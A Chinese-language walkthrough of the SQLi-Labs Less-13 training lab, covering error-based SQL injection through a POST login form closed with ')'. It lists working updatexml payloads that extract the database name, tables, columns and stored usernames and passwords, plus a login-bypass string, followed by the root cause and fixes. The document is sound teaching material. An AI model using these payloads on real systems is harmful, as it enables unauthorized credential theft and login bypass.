# SQLi-Labs | Less-13 POST 单引号括号 ') 注入 报错注入
## 一、漏洞简介
本关为POST表单登录注入，输入的用户名被 `('$uname')` 包裹，闭合符号为 `')`。页面不会直接展示查询的数据结果，但是MySQL错误信息会回显在页面，适合使用updatexml报错注入来提取数据库信息，无法直接使用union联合查询。
## 二、环境信息
靶场地址：http://127.0.0.1/sqli-labs/
关卡路径：/Less-13/
注入类型：POST、字符型、')闭合、报错注入
## 三、复现步骤
1. 打开BP，开启代理，访问Less-13登录页面，随便输入账号密码提交，在BP中抓到POST数据包，参数为uname、passwd。
2. 测试闭合：在uname参数填入 `admin')`，提交，页面出现SQL报错，确认闭合方式是 `')`。
3. 测试注释：uname填入 `admin') --+`，密码随意填写，提交后成功登录，说明可以注释掉后面的SQL语句。
4. 构造updatexml报错注入payload，填入uname参数，提交，页面报错带出数据库数据。
5. 依次修改payload，获取库名、表名、字段名、数据。
## 四、Payload
获取数据库名：
`uname=') and updatexml(1,concat(0x7e,database(),0x7e),1) --+ & passwd=1`
获取该库下所有表：
`uname=') and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) --+ & passwd=1`
获取users表字段：
`uname=') and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users'),0x7e),1) --+ & passwd=1`
获取账号密码数据：
`uname=') and updatexml(1,concat(0x7e,(select group_concat(username,0x7e,password) from users),0x7e),1) --+ & passwd=1`
绕过登录：
`uname=admin') --+ & passwd=123`
## 五、漏洞原理
后端SQL语句：
`SELECT * FROM users WHERE username=('$uname') AND password=('$passwd')`
直接把前端传入的uname参数拼接进SQL语句，没有使用预编译，用户可控输入可以闭合原有单引号与括号，注入额外SQL语句。开启了MySQL错误回显，利用updatexml函数参数格式错误，将查询结果拼入报错信息。
## 六、修复方案
1. 使用PDO预编译参数化查询，禁止直接拼接用户输入到SQL语句。
2. 关闭Web应用的MySQL详细错误信息输出。
3. 对用户名、密码输入做严格输入过滤，过滤 `'`、`)`、`and`、`updatexml` 等危险字符与函数。
## 七、总结
Less13是经典POST报错注入关卡，重点是判断 `')` 这个闭合形式。页面没有查询结果回显，所以不能用union，优先使用报错注入提取数据。和Less12的区别是本关没有查询结果回显。